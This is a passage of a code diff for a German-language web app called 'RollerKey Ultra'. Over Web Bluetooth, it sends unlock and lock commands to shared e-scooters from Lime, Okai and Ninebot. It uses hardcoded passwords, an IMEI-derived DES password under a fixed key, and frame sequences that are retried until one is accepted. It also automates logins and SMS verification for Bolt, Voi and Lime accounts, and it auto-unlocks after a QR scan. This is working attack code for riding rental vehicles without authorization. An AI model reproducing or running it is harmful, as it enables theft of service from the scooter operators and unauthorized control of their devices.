+    for (let i = 0; i < 8; i++) c = (c & 0x8000) ? ((c << 1) ^ 0x1021) & 0xFFFF : (c << 1) & 0xFFFF;
+  }
+  return c;
+}
+
+function frame(cmd, payload){
+  const p = payload instanceof Uint8Array ? payload : tb(String(payload));
+  const body = [cmd >> 8 & 0xFF, cmd & 0xFF, p.length, ...p];
+  const c = crc16(Uint8Array.from(body));
+  return Uint8Array.from([0x46, 0x43, ...body, c >> 8 & 0xFF, c & 0xFF]);
+}
+
+function nbFrame(cmd, arg){
+  const b = [0x5A, 0xA5, 0x02, 0x3E, 0x20, cmd, arg || 0];
+  let s = 0;
+  for (const x of b) s = (s + x) & 0xFF;
+  b.push(s ^ 0xFF);
+  return Uint8Array.from(b);
+}
+
+const DES = (() => {
+  const num = s => s.split(",").map(Number);
+  const P1 = num("57,49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,60,52,44,36,63,55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,29,21,13,5,28,20,12,4");
+  const P2 = num("14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,16,7,27,20,13,2,41,52,31,37,47,55,30,40,51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32");
+  const SH = [1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1];
+  const IP = num("58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8,57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3,61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7");
+  const FP = num("40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25");
+  const E = num("32,1,2,3,4,5,4,5,6,7,8,9,8,9,10,11,12,13,12,13,14,15,16,17,16,17,18,19,20,21,20,21,22,23,24,25,24,25,26,27,28,29,28,29,30,31,32,1");
+  const P = num("16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25");
+  const SB = [
+    num("14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13"),
+    num("15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9"),
+    num("10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12"),
+    num("7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14"),
+    num("2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3"),
+    num("12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13"),
+    num("4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12"),
+    num("13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11")
+  ];
+  const bits = u8 => {
+    const b = [];
+    for (const x of u8) for (let i = 7; i >= 0; i--) b.push(x >> i & 1);
+    return b;
+  };
+  const pack = b => {
+    const o = new Uint8Array(b.length / 8);
+    for (let i = 0; i < o.length; i++){
+      let v = 0;
+      for (let j = 0; j < 8; j++) v = v << 1 | b[i * 8 + j];
+      o[i] = v;
+    }
+    return o;
+  };
+  const perm = (b, t) => t.map(i => b[i - 1]);
+  const rot = (b, n) => b.slice(n).concat(b.slice(0, n));
+  function keys(key){
+    const kp = perm(bits(key), P1);
+    let c = kp.slice(0, 28), d = kp.slice(28);
+    const out = [];
+    for (let i = 0; i < 16; i++){
+      c = rot(c, SH[i]); d = rot(d, SH[i]);
+      out.push(perm(c.concat(d), P2));
+    }
+    return out;
+  }
+  function feistel(r){
+    const e = perm(r, E);
+    const x = [];
+    for (let i = 0; i < 8; i++){
+      const b = e[i * 6] * 32 + e[i * 6 + 1] * 16 + e[i * 6 + 2] * 8 +
+                e[i * 6 + 3] * 4 + e[i * 6 + 4] * 2 + e[i * 6 + 5];
+      const v = SB[i][(((b >> 4) & 2) | (b & 1)) * 16 + ((b >> 1) & 15)];
+      x.push(v >> 3 & 1, v >> 2 & 1, v >> 1 & 1, v & 1);
+    }
+    return perm(x, P);
+  }
+  return function(key, block){
+    const ks = keys(key);
+    const bp = perm(bits(block), IP);
+    let l = bp.slice(0, 32), r = bp.slice(32);
+    for (let i = 0; i < 16; i++){
+      const f = feistel(r);
+      const nl = r;
+      r = l.map((v, j) => v ^ f[j]);
+      l = nl;
+    }
+    return pack(perm(r.concat(l), FP));
+  };
+})();
+
+function hexU8(hex){
+  const u = new Uint8Array(hex.length / 2);
+  for (let i = 0; i < u.length; i++) u[i] = parseInt(hex.substr(i * 2, 2), 16);
+  return u;
+}
+
+function atPw(imei){
+  const k = Uint8Array.from([0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88]);
+  const o = DES(k, tb((String(imei) + "        ").slice(0, 8)));
+  return [o[4], o[5], o[6], o[7]].map(x => x.toString(16).padStart(2, "0")).join("").toUpperCase();
+}
+
+const desTest = () =>
+  [].slice.call(DES(hexU8("133457799BBCDFF1"), hexU8("0123456789ABCDEF")))
+    .map(x => x.toString(16).padStart(2, "0")).join("").toUpperCase();
+
+const frameTest = () =>
+  packAT("OKSCM", [OKAI_PW, "1"]).replace(/[0-9A-F]{4}\$\s*$/, "SEQ$")
+    === "AT+OKSCM=OKAIYLBT,1,SEQ$";
+
+function btErr(e){
+  const m = String(e && e.message || e || "");
+  if (/cancel/i.test(m)) return "abgebrochen";
+  if (/not found/i.test(m)) return "nicht gefunden";
+  if (/network/i.test(m)) return "Netzfehler";
+  if (/gatt/i.test(m)) return "GATT-Fehler";
+  if (/denied|permission/i.test(m)) return "verweigert";
+  return kurz(m, 60) || "unbekannt";
+}
+
+const famVon = n => /okai/i.test(n) ? "okai"
+  : /ninebot|segway/i.test(n) ? "ninebot" : "lime";
+
+function kanalLeeren(){
+  const sel = $("iKanal");
+  while (sel.options.length > 1) sel.remove(1);
+}
+
+const warteAntwort = async ms => {
+  const t0 = Date.now();
+  while (Date.now() - t0 < ms){
+    if (S.notes > 0) return true;
+    await sleep(60);
+  }
+  return false;
+};
+
+async function bauartFinden(){
+  const fest = $("iFam").value;
+  const reihe = S.chans.slice(0, 3);
+  const folge = fest ? [fest]
+    : (S.fam === "okai" ? ["okai", "lime", "ninebot"]
+      : S.fam === "ninebot" ? ["ninebot", "okai", "lime"]
+        : ["lime", "okai", "ninebot"]);
+
+  for (const e of reihe){
+    for (const art of folge){
+      S.notes = 0;
+      let rohOk = false;
+      try {
+        if (art === "okai") rohOk = await writeTo(e.c, buf(tb(packAT("OKBCL", []))));
+        else if (art === "lime") rohOk = await writeTo(e.c, buf(frame(0x1101, "LIM EBIKE")));
+        else rohOk = await writeTo(e.c, buf(nbFrame(0x01, 0)));
+      } catch(_){ rohOk = false }
+      if (!rohOk) continue;
+      if (await warteAntwort(600)){
+        S.chan = e; S.fam = art;
+        $("vFam").textContent = art.toUpperCase();
+        log("Bauart erkannt · " + art + " auf " + e.c.uuid.slice(0, 8), "g");
+        return;
+      }
+    }
+  }
+  S.chan = S.chans[0] || null;
+  $("vFam").textContent = S.fam.toUpperCase() + "?";
+  log("keine Antwort auf Testrahmen · bleibe bei " + S.fam, "y");
+}
+
+async function connect(){
+  if (!navigator.bluetooth) throw new Error("kein Bluetooth (Bluefy nutzen)");
+  S.picking = true; paint();
+  stat("Gerät wählen …", "warn");
+  let dev;
+  try {
+    dev = await navigator.bluetooth.requestDevice({
+      acceptAllDevices: true,
+      optionalServices: [
+        "0000180f-0000-1000-8000-00805f9b34fb",
+        "0000fff0-0000-1000-8000-00805f9b34fb",
+        "0000ffe0-0000-1000-8000-00805f9b34fb",
+        "6e400001-b5a3-f393-e0a9-e50e24dcca9e",
+        OKAI_SVC
+      ]
+    });
+  } catch(e){
+    S.picking = false; paint();
+    throw new Error(btErr(e));
+  }
+  S.picking = false;
+  S.chans = []; S.chan = null;
+  funkReset();
+  kanalLeeren();
+  paint();
+
+  dev.addEventListener("gattserverdisconnected", onDrop);
+  S.dev = dev;
+  S.fam = famVon(dev.name || "");
+  log("Gerät · " + (dev.name || "?") + " (Name deutet auf " + S.fam + ")", "g");
+
+  try {
+    await openLink(dev);
+  } catch(e){
+    try { if (dev.gatt.connected) dev.gatt.disconnect() } catch(_){}
+    S.dev = null; S.chans = []; S.chan = null;
+    funkReset(); kanalLeeren(); paint();
+    throw e;
+  }
+}
+
+async function openLink(dev){
+  for (let i = 0; i < 3; i++){
+    try {
+      const srv = dev.gatt.connected ? dev.gatt : await dev.gatt.connect();
+      await collect(srv);
+      if (S.chans.length){
+        S.settle = Date.now() + SETTLE_MS;
+        await sleep(SETTLE_MS);
+        await bauartFinden();
+        startHs();
+        $("bt").textContent = dev.name || "verbunden";
+        $("bt").classList.add("on");
+        $("punkt").classList.add("on");
+        stat("verbunden · " + S.chans.length + " Kanal · " + S.fam, "ok");
+        paint();
+        return;
+      }
+      log("keine passenden Kanäle", "y");
+    } catch(e){ log("Aufbau " + (i + 1) + " · " + btErr(e), "y") }
+    await sleep(600 + i * 700);
+  }
+  throw new Error("Verbindung kam nicht zustande");
+}
+
+async function collect(srv){
+  try {
+    const svc = await srv.getPrimaryService(OKAI_SVC);
+    try { bind(await svc.getCharacteristic(OKAI_WRITE), true) } catch(_){}
+    try {
+      const n = await svc.getCharacteristic(OKAI_NOTIFY);
+      if (!n.__rk){
+        n.__rk = true;
+        n.addEventListener("characteristicvaluechanged", ev => statusAus(new Uint8Array(ev.target.value.buffer)));
+        n.startNotifications().catch(() => {});
+      }
+    } catch(_){}
+  } catch(_){}
+
+  let svcs = [];
+  try { svcs = await srv.getPrimaryServices() } catch(_){}
+  for (const svc of svcs){
+    let chs = [];
+    try { chs = await svc.getCharacteristics() } catch(_){}
+    for (const ch of chs) if (ch.properties.write || ch.properties.writeWithoutResponse) bind(ch);
+  }
+}
+
+function bind(ch, vorne){
+  if (ch.__rk) return;
+  ch.__rk = true;
+  const eintrag = { c: ch };
+  if (vorne) S.chans.unshift(eintrag); else S.chans.push(eintrag);
+  const sel = $("iKanal");
+  const o = document.createElement("option");
+  o.value = ch.uuid;
+  o.textContent = ch.uuid.slice(0, 8);
+  sel.appendChild(o);
+  if (ch.properties.notify || ch.properties.indicate){
+    ch.addEventListener("characteristicvaluechanged", ev => statusAus(new Uint8Array(ev.target.value.buffer)));
+    ch.startNotifications().catch(() => {});
+  }
+}
+
+function okaiAus(f){
+  S.notes++;
+  let s = "";
+  for (const b of f) s += String.fromCharCode(b);
+  S.rx += s;
+  for (let g = 0; g < 32; g++){
+    const st = S.rx.indexOf("AT+");
+    if (st < 0){ if (S.rx.length > 400) S.rx = ""; break }
+    if (st > 0) S.rx = S.rx.slice(st);
+    const en = S.rx.indexOf("$");
+    if (en < 0){ if (S.rx.length > 400) S.rx = ""; break }
+    const rahmen = S.rx.slice(0, en + 1);
+    S.rx = S.rx.slice(en + 1).replace(/^\r?\n/, "");
+    antwort(rahmen);
+  }
+}
+
+function antwort(rahmen){
+  const m = rahmen.replace(/\r?\n+$/, "").match(/^AT\+([A-Z0-9_]{2,6})=([\s\S]*)\$$/);
+  if (!m) return;
+  const op = m[1];
+  const felder = m[2].length ? m[2].split(",") : [];
+  if (felder.length && /^[0-9A-Fa-f]{4}$/.test(felder[felder.length - 1])) felder.pop();
+  log("< " + op + (felder.length ? " " + felder.join(",") : ""), "h");
+  if (op === "OKBCL"){
+    const n = felder.map(x => parseInt(x, 10)).find(v => !isNaN(v) && v >= 0 && v <= 100);
+    if (n !== undefined){ S.akku = n; $("vAkku").textContent = n + " %" }
+  }
+  if (op === "OKSCM"){
+    const rest = felder.filter(x => x !== OKAI_PW && x !== OKAI_SVC_PW);
+    const v = rest[rest.length - 1];
+    if (v === "0" && !S.offen){
+      S.offen = true;
+      log("offen gemeldet", "g");
+      if (!S.fahrt.laeuft) fahrtStart();
+    }
+    if (v === "1") S.offen = false;
+  }
+}
+
+function statusAus(f){
+  if (!f || !f.length) return;
+  if (S.fam === "okai" || /AT\+/.test(String.fromCharCode.apply(null, f.slice(0, 3)))){ okaiAus(f); return }
+  S.notes++;
+  if (f.length > 19 && f[19] > 0 && f[19] < 101){
+    S.akku = f[19];
+    $("vAkku").textContent = S.akku + " %";
+  }
+  if (f.length > 20){
+    S.tempo = f[20];
+    $("vTempo").textContent = S.tempo + " km/h";
+  }
+  if (f.length > 23){
+    if (f[23] === 0xF1 && !S.offen){
+      S.offen = true;
+      log("offen gemeldet", "g");
+      if (!S.fahrt.laeuft) fahrtStart();
+    }
+    if (f[23] === 0xF0) S.offen = false;
+  }
+}
+
+function onDrop(){
+  log("Verbindung getrennt", "y");
+  stopHs(); stopKeep();
+  S.dev = null; S.chans = []; S.chan = null; S.offen = false;
+  funkReset(); kanalLeeren();
+  $("bt").textContent = "nicht verbunden";
+  $("bt").classList.remove("on");
+  $("punkt").classList.remove("on");
+  paint();
+}
+
+async function writeTo(ch, data){
+  try {
+    if (ch.properties.writeWithoutResponse && $("iModus").value !== "resp"){
+      await ch.writeValueWithoutResponse(data);
+    } else {
+      await ch.writeValue(data);
+    }
+    return true;
+  } catch(e){
+    try { if (ch.properties.write){ await ch.writeValue(data); return true } } catch(_){}
+    log("Schreiben · " + btErr(e), "e");
+    return false;
+  }
+}
+
+function bester(){
+  const wahl = $("iKanal").value;
+  if (wahl){
+    const x = S.chans.find(k => k.c.uuid === wahl);
+    if (x) return x;
+  }
+  if (S.chan) return S.chan;
+  return S.chans[0] || null;
+}
+
+async function rohBle(data){
+  const x = bester();
+  if (!x) return false;
+  return writeTo(x.c, buf(data));
+}
+
+async function push(f, wartenAuf){
+  const ch = bester();
+  if (!ch) throw new Error("kein Kanal");
+  if (wartenAuf) S.notes = 0;
+  const ok = await writeTo(ch.c, buf(f));
+  if (!ok) throw new Error("Schreiben fehlgeschlagen");
+  if (!wartenAuf) return true;
+  for (let i = 0; i < 30; i++){
+    await sleep(100);
+    if (S.notes > 0) return true;
+  }
+  return false;
+}
+
+async function sendeAT(op, felder){
+  if (!S.dev) throw new Error("erst VERBINDEN");
+  const zeile = packAT(op, felder);
+  log("> " + zeile.trim(), "h");
+  return push(tb(zeile), true);
+}
+
+function startHs(){
+  stopHs();
+  if (S.fam !== "lime") return;
+  S.hsRun = true;
+  const takt = async () => {
+    if (!S.hsRun) return;
+    if (S.dev && S.dev.gatt.connected) await rohBle(frame(0x1101, "LIM EBIKE"));
+    if (S.hsRun) S.hs = setTimeout(takt, HS_MS);
+  };
+  takt();
+}
+function stopHs(){ S.hsRun = false; clearTimeout(S.hs) }
+
+function keep(){
+  stopKeep();
+  S.keepRun = true;
+  S.keep = setInterval(async () => {
+    if (!S.dev || !S.dev.gatt.connected) return;
+    if (S.fam === "okai") await push(tb(packAT("OKSCM", [OKAI_PW, "0"])), false).catch(() => {});
+    else if (S.fam === "lime") await rohBle(frame(0x1101, "LIM EBIKE"));
+  }, KEEP_MS);
+}
+function stopKeep(){ clearInterval(S.keep); S.keepRun = false }
+const startKeep = keep;
+
+async function stoss(kind){
+  const auf = kind === "unlock";
+  const at = [];
+  const bin = [];
+  const nb = [];
+
+  const mitImei = $("iImei").value.replace(/\D/g, "");
+  at.push(() => sendeAT("OKSCM", [OKAI_PW, auf ? "0" : "1"]));
+  if (mitImei.length === 15) at.push(() => sendeAT("OKSCM", [atPw(mitImei), auf ? "0" : "1"]));
+  at.push(() => sendeAT("OKSCM", [auf ? "0" : "1"]));
+
+  bin.push(() => push(frame(0x1661, Uint8Array.from([auf ? 0xF1 : 0xF0])), true));
+  bin.push(() => push(frame(0x1661, Uint8Array.from([auf ? 0x01 : 0x00])), true));
+  nb.push(() => push(nbFrame(auf ? 0x01 : 0x02, 0), true));
+
+  const reihe = S.fam === "okai" ? [...at, ...bin, ...nb]
+    : S.fam === "ninebot" ? [...nb, ...at, ...bin]
+      : [...bin, ...at, ...nb];
+
+  for (const v of reihe){
+    if (await v().catch(() => false)) return true;
+    await sleep(350);
+  }
+  return false;
+}
+
+async function unlock(){
+  if (Date.now() - S.lastUn < 1500) return;
+  if (!S.qr) throw new Error("erst QR scannen oder Nummer eintragen");
+
+  if (S.dev && S.dev.gatt.connected && S.chans.length){
+    S.lastUn = Date.now();
+    stat("entsperre über Bluetooth …", "warn");
+    const btOk = await stoss("unlock").catch(() => false);
+    if (btOk){
+      stat("Entsperrbefehl gesendet.", "ok");
+      log("ENTSPERREN über Bluetooth", "g");
+      if (!S.fahrt.laeuft) fahrtStart();
+      startKeep();
+      return;
+    }
+    log("Bluetooth ohne Antwort · versuche Anbieter", "y");
+  }
+
+  await autoKette();
+}
+
+async function lock(){
+  let ok = false;
+  if (S.dev) ok = await stoss("lock").catch(() => false);
+  if (!ok) ok = await apiLock().catch(() => false);
+  if (ok){ log("SPERREN gesendet", "g"); stat("gesperrt.", "ok"); fahrtStop(); stopKeep() }
+  else stat("keine Antwort.", "err");
+}
+
+async function diagnose(){
+  if (!S.dev) throw new Error("erst VERBINDEN");
+  log("Notizen: " + S.notes + " · Kanäle: " + S.chans.length + " · Bauart " + S.fam, "h");
+  for (const x of S.chans) log("Kanal " + x.c.uuid.slice(0, 8), "h");
+  S.notes = 0;
+  if (S.fam === "lime"){
+    await push(frame(0x1663, Uint8Array.from([0x01])), true).catch(() => {});
+    await sleep(500);
+    await push(frame(0x1613, Uint8Array.from([0x01])), true).catch(() => {});
+  } else if (S.fam === "okai"){
+    await sendeAT("OKPWD", [OKAI_PW]).catch(() => {});
+    await sleep(500);
+    await sendeAT("OKBCL", []).catch(() => {});
+  } else {
+    await push(nbFrame(0x01, 0), true).catch(() => {});
+  }
+  await sleep(500);
+  log("Antworten: " + S.notes, S.notes ? "g" : "y");
+}
+
+async function at(op, felder){
+  const ok = await sendeAT(op, felder || []);
+  if (!ok) stat("keine Antwort.", "err");
+  return ok;
+}
+
+async function otpSenden(){
+  const p = $("iPhone").value.trim();
+  if (!/\d{6,}/.test(p.replace(/\s/g, ""))) throw new Error("Nummer fehlt");
+
+  if (S.brand === "bolt"){
+    const intl = await roh("https://user.bolt.eu/user/getMobileNumberInInternationalFormat?phone=" +
+      enc(p) + "&version=CI.23.0&deviceId=" + DEVTOK + "&deviceType=iphone&language=de");
+    const nr = intl.json && intl.json.data && intl.json.data.phone_number_in_international_format;
+    if (!nr) throw new Error("Nummer unbrauchbar · " + intl.status);
+    $("iPhone").value = nr;
+    const r = await roh("https://user.bolt.eu/user/register/phone?preferred_verification_method=sms&version=CI.23.0&deviceId=" +
+      DEVTOK + "&deviceType=iphone&language=de", {
+      method:"POST", headers:H(null), body:J({ phone: nr, phone_uuid: DEVTOK })
+    });
+    if (!r.json || r.json.code !== 0) throw new Error("Bolt SMS · " + r.status);
+    stat("Bolt-Code angefordert.", "ok");
+    return;
+  }
+
+  if (!S.acct) throw new Error("erst Konto");
+  const r = await limeV2("/onboarding/phone_number", S.acct.t, { phone_number:p });
+  if (!r.ok) throw new Error("SMS " + r.status + " " + saub(r.text));
+  stat("Code angefordert.", "ok");
+}
+
+async function otpPruefen(){
+  const p = $("iPhone").value.trim();
+  const c = $("iOtp").value.replace(/\D/g, "");
+  if (!c) throw new Error("Code fehlt");
+
+  if (S.brand === "bolt"){
+    const r = await roh("https://node.bolt.eu/user/user/v1/confirmVerification?version=CI.23.0&deviceId=" +
+      DEVTOK + "&deviceType=iphone&language=de", {
+      method:"POST", headers:H(null),
+      body:J({ phone:p, phone_uuid:DEVTOK, verification:{ confirmation_data:{ code:c } } })
+    });
+    if (!r.json || r.json.code !== 0) throw new Error("Code falsch · " + r.status);
+    S.boltBasic = "Basic " + btoa(p + ":" + DEVTOK);
+    ls("boltBasic", S.boltBasic);
+    const a = { adr:p, dom:"bolt", t:S.boltBasic, card:S.card, rest:0 };
+    S.konten.bolt = a; saveAcc(); S.acct = a;
+    stat("Bolt bestätigt.", "ok");
+    paint();
+    return;
+  }
+
+  if (!S.acct) throw new Error("erst Konto");
+  const r = await limeV2("/onboarding/phone_number", S.acct.t, { phone_number:p, code:c });
+  if (!r.ok) throw new Error("Code " + r.status + " " + saub(r.text));
+  stat("Telefon bestätigt.", "ok");
+}
+
+async function voiAnmelden(){
+  const rohText = $("iLink").value.trim();
+  const m = rohText.match(/link\.voiapp\.io\/([A-Za-z0-9]+)/) || rohText.match(/^([A-Za-z0-9]{8,})$/);
+  if (!m) throw new Error("Voi-Link nicht erkannt");
+  const mail = $("iOwn").value.trim() || "rider@rollerkey.de";
+  const p = await roh("https://api.voiapp.io/v1/auth/verify/presence", {
+    method:"POST", headers:{ "Content-Type":"application/json" }, body:J({ email:mail, token:m[1] })
+  });
+  const at = p.json && p.json.authToken;
+  if (!at) throw new Error("Voi-Link abgelehnt · " + p.status);
+  const s = await roh("https://api.voiapp.io/v1/auth/session", {
+    method:"POST", headers:{ "Content-Type":"application/json" }, body:J({ authenticationToken: at })
+  });
+  const acc = s.json && s.json.accessToken;
+  if (!acc) throw new Error("Voi-Session · " + s.status);
+  S.voiTok = acc; ls("voiTok", acc);
+  const a = { adr:mail, dom:"voi", t:acc, card:S.card, rest:0 };
+  S.konten.voi = a; saveAcc(); S.acct = a;
+  stat("Voi angemeldet.", "ok");
+  paint();
+}
+
+/* ═══════ QR ═══════ */
+
+let jsqrP = null;
+function loadJsQR(){
+  if (window.jsQR) return Promise.resolve();
+  if (jsqrP) return jsqrP;
+  jsqrP = new Promise((res, rej) => {
+    const s = document.createElement("script");
+    s.src = "https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js";
+    s.onload = () => res();
+    s.onerror = () => { jsqrP = null; rej(new Error("Scanner nicht ladbar")) };
+    document.head.appendChild(s);
+  });
+  return jsqrP;
+}
+
+function stopCam(){
+  cancelAnimationFrame(S.raf);
+  if (S.cam) S.cam.getTracks().forEach(t => t.stop());
+  S.cam = null;
+  $("cam").style.display = "none";
+}
+
+async function scan(){
+  stopCam();
+  stat("Kamera …", "warn");
+  let st;
+  try {
+    st = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+  } catch(e){
+    throw new Error("Kamera " + btErr(e));
+  }
+  S.cam = st;
+  const v = $("cam");
+  v.srcObject = st;
+  v.style.display = "block";
+  await v.play().catch(() => {});
+  let det = null;
+  try { if ("BarcodeDetector" in window) det = new window.BarcodeDetector({ formats:["qr_code"] }) } catch(_){}
+  if (!det) await loadJsQR();
+  const tick = async () => {
+    if (!S.cam) return;
+    try {
+      if (det){
+        const r = await det.detect(v);
+        if (r && r.length){ onQr(r[0].rawValue); return }
+      } else if (window.jsQR && v.videoWidth){
+        const c = document.createElement("canvas");
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        const g = c.getContext("2d");
+        g.drawImage(v, 0, 0);
+        const d = g.getImageData(0, 0, c.width, c.height);
+        const q = window.jsQR(d.data, c.width, c.height);
+        if (q && q.data){ onQr(q.data); return }
+      }
+    } catch(_){}
+    S.raf = requestAnimationFrame(tick);
+  };
+  S.raf = requestAnimationFrame(tick);
+  stat("Code in den Rahmen halten.", "warn");
+}
+
+function onQr(text){
+  stopCam();
+  let code = "";
+  try {
+    const u = new URL(text);
+    const teile = u.pathname.split("/").filter(Boolean);
+    code = (teile[teile.length - 1] || "").replace(/=+$/, "");
+    if (!code) code = u.searchParams.get("c") || u.searchParams.get("code") || "";
+  } catch(_){
+    const m = String(text).match(/([A-Za-z0-9\-]{4,})/);
+    code = m ? m[1] : "";
+  }
+  code = code.replace(/[^A-Za-z0-9\-]/g, "");
+  if (code.length < 4){ stat("Code unlesbar.", "err"); return }
+  S.qr = code;
+  $("qrbox").textContent = "Code: " + code;
+  paint();
+  if (S.auto && !S.offen){
+    stat("Code " + code + " · läuft", "warn");
+    guard(unlock, 600000)();
+  } else if (S.offen){
+    stat("Code " + code + " · Fahrt läuft schon", "ok");
+  } else {
+    stat("Code " + code + " · jetzt entsperren", "ok");
+  }
+}
+
+/* ═══════ ANZEIGE ═══════ */
+
+let sig = "";
+function paint(){
+  const a = S.acct;
+  $("uMail").textContent = a ? a.adr : "–";
+  $("uBal").textContent = a ? money(a.rest || 0) : "–";
+  $("uState").textContent = S.prov ? "wird angelegt" : (a ? "bereit" : "keins");
+  $("marke").textContent = S.brand.toUpperCase();
+  $("bAuto").textContent = S.auto ? "AUTO AN · SCANNEN ENTSPERRT" : "AUTO AUS";
+  $("bAuto").classList.toggle("an", S.auto);
+  document.querySelectorAll(".brands button").forEach(b => b.classList.toggle("on", b.dataset.b === S.brand));
+  const s = [S.busy, S.prov, !!S.dev, !!a, !!S.card, !!(a && a.card),
+             S.fahrt.laeuft, S.picking, !!S.qr, S.brand, S.auto].join();
+  if (s === sig) return;
+  sig = s;
+  $("bUnlock").disabled = !S.qr;
+  $("bApiUn").disabled = !S.qr;
+  $("bLock").disabled = !S.dev && !a;
+  $("bDiag").disabled = !S.dev;
+  $("bConn").disabled = !!S.dev || S.picking;
+  $("bNew").disabled = S.prov || S.brand !== "lime";
+  $("bNew2").disabled = S.prov;
+  $("bBal").disabled = !a || S.brand !== "lime";
+  $("bDrop").disabled = !a;
+  $("bUse").disabled = !S.card || !a || S.brand !== "lime";
+  $("bDel").disabled = !a || !(a.card) || S.brand !== "lime";
+  $("bCode").disabled = !a || S.brand !== "lime";
+  $("bPre").disabled = !a || S.brand !== "lime";
+  $("bDef").disabled = !a || !(a.card && a.card.id) || S.brand !== "lime";
+  $("bRing").disabled = !a || !S.qr;
+  $("bRideStop").disabled = !S.fahrt.laeuft;
+  $("bOtp").disabled = S.brand === "voi";
+  $("bOtp2").disabled = S.brand === "voi";
+  cardPaint();
+  fahrtPaint();
+}
+
+/* ═══════ START ═══════ */
+
+function boot(){
+  S.relay = lg("relay", RELAY_STD);
+  $("iRelay").value = S.relay;
+  S.bin = lg("bin", "");
+  $("iBin").value = S.bin;
+  S.block = lg("block", []);
+  S.gut = lg("gut", "");
+  S.pk = lg("pk", {}) || {};
+  S.boltBasic = lg("boltBasic", "");
+  S.voiTok = lg("voiTok", "");
+  S.auto = lg("auto", true) !== false;
+  if (S.pk.lime) $("iPk").value = S.pk.lime;
+  const k = lg("konten", null);
+  if (k) for (const b of ["lime","voi","bolt"]) if (k[b]) S.konten[b] = k[b];
+  funkReset();
+  sync();
+  fahrtReset();
+  stat("bereit.", "ok");
+  log("RollerKey Ultra gestartet", "h");
+  log("CRC " + (crc16(tb("123456789")) === 0x31C3 ? "ok" : "FEHLER"), "h");
+  log("DES " + (desTest() === "85E813540F0AB405" ? "ok" : "FEHLER"), "h");
+  log("AT " + (frameTest() ? "ok" : "FEHLER"), "h");
+  log("Relay " + (S.relay ? "gesetzt" : "fehlt"), S.relay ? "g" : "y");
+  log("Auto " + (S.auto ? "an" : "aus"), "h");
+
+  $("bConn").onclick = guard(connect);
+  $("bUnlock").onclick = guard(unlock, 600000);
+  $("bApiUn").onclick = guard(autoKette, 600000);
+  $("bLock").onclick = guard(lock, 60000);
+  $("bDiag").onclick = guard(diagnose, 60000);
+  $("bScan").onclick = guard(scan, 60000);
+  $("bAuto").onclick = () => {
+    S.auto = !S.auto; ls("auto", S.auto);
+    sig = ""; paint();
+    stat(S.auto ? "Auto an · Scan entsperrt sofort" : "Auto aus · erst entsperren drücken", "ok");
+  };
+  $("bTorch").onclick = async () => {
+    if (!S.cam) return;
+    S.torch = !S.torch;
+    try { await S.cam.getVideoTracks()[0].applyConstraints({ advanced: [{ torch: S.torch }] }) } catch(_){}
+  };
+  $("bPlate").onclick = () => {
+    const v = $("iPlate").value.toUpperCase().replace(/[^A-Z0-9\-]/g, "");
+    if (v.length < 4) return stat("Nummer zu kurz.", "warn");
+    S.qr = v;
+    $("qrbox").textContent = "Code: " + v;
+    paint();
+    if (S.auto && !S.offen){ stat("Nummer " + v + " · läuft", "warn"); guard(unlock, 600000)() }
+    else stat("Nummer " + v + " · jetzt entsperren", "ok");
+  };
+  $("bQrCopy").onclick = async () => {
+    if (!S.qr) return;
+    try { await navigator.clipboard.writeText(S.qr); stat("kopiert.", "ok") } catch(_){}
+  };
+
+  $("bNew").onclick = guard(provision, 600000);
+  $("bBal").onclick = guard(async () => {
+    const r = await guthaben();
+    if (S.acct){ S.acct.rest = r; saveAcc() }
